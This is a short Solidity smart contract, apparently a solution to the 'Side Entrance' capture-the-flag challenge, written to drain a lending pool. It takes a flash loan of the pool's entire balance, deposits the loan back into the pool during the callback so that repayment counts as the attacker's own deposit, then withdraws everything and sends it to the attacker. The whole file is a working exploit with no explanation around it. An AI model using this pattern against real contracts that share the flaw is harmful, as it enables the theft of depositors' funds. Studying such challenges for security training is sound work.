// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IPool{
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackSideEntrance{
    IPool pool;
    address attacker;

    constructor (address payable _address){
        attacker = msg.sender;
        pool = IPool(_address);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();

    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable{
        payable(attacker).transfer(address(this).balance);

    }

}